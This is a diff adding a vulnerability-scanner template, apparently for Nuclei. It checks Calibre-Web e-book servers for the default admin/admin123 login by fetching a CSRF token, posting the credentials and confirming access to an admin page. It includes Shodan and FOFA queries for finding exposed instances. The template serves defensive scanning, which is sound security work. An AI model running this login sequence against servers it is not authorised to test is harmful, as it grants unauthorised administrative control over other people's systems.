@@ -1,0 +1,91 @@
+id: calibre-web-default-login
+
+info:
+  name: Calibre-Web - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    Calibre-Web creates the administrator account admin with the password admin123 when its application database is initialized, and the official README tells users to log in with these credentials. An attacker who logs in with them gains full administrative access to the e-book server, including user management, library and upload settings and the configuration of external binaries.
+  reference:
+    - https://github.com/janeczku/calibre-web/blob/0.6.27/README.md
+    - https://github.com/janeczku/calibre-web/blob/0.6.27/cps/constants.py
+    - https://github.com/janeczku/calibre-web/blob/0.6.27/cps/ub.py
+    - https://docs.linuxserver.io/images/docker-calibre-web/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+    cpe: cpe:2.3:a:calibre-web_project:calibre-web:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    vendor: calibre-web_project
+    product: calibre-web
+    shodan-query: http.title:"Calibre-Web"
+    fofa-query: title="Calibre-Web"
+  tags: calibre-web,default-login,vuln
+
+variables:
+  username: admin
+  password: admin123
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - raw:
+      - |
+        GET /login HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "Calibre-Web")'
+          - 'contains_all(body, "name=\"csrf_token\"", "name=\"remember_me\"")'
+        condition: and
+        internal: true
+
+    extractors:
+      - type: regex
+        name: csrf_token
+        part: body
+        group: 1
+        regex:
+          - 'name="csrf_token" value="([^"]+)"'
+        internal: true
+
+  - raw:
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{BaseURL}}/login
+
+        next=%2F&csrf_token={{url_encode(csrf_token)}}&username={{username}}&password={{password}}&remember_me=on&submit=
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 302'
+          - 'regex("(?mi)^location:\\s*(https?://[^/\\s]+)?/\\s*$", header)'
+          - 'regex("(?mi)^set-cookie:\\s*[a-z0-9_-]*remember_token=", header)'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        GET /admin/dbconfig HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+          - 'contains_all(body, "id=\"logout\"", "id=\"config_calibre_dir\"", "href=\"/me\"")'
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - username + ":" + password
